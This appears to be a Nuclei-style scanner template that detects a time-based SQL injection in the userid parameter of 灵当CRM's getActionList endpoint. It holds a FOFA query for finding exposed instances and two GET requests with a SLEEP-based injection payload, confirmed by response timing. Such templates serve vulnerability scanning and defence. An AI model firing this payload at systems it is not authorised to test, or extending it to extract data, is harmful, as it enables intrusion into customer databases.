id: poc-yaml-51mis-crm-getactionList-userid-sqli
info:
  name: 灵当CRM getActionList userid SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 灵当CRM
    fofa: |
      body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")

variables:
  t1: '{{rand_int(6,9)}}'
  t2: '{{to_number(t1) + 2}}'
  t3: '{{rand_int(1,4)}}'
  t4: '{{to_number(t3) + 2}}'

http:
  - raw:
      - |
        GET /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&userid=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP({{t1}})))HtiS)--%20cbVc--+ HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"result"'
          - '"code":1'
          - '"msg":"success"'
        condition: and
      - type: dsl
        dsl:
          - duration >= to_number(t1)
          - duration <= to_number(t2)
      - type: word
        part: body
        words:
          - "<"
        negative: true

  - raw:
      - |
        GET /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&userid=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP({{t3}})))HtiS)--%20cbVc--+ HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"result"'
          - '"code":1'
          - '"msg":"success"'
        condition: and
      - type: dsl
        dsl:
          - duration >= to_number(t3)
          - duration <= to_number(t4)
      - type: word
        part: body
        words:
          - "<"
        negative: true
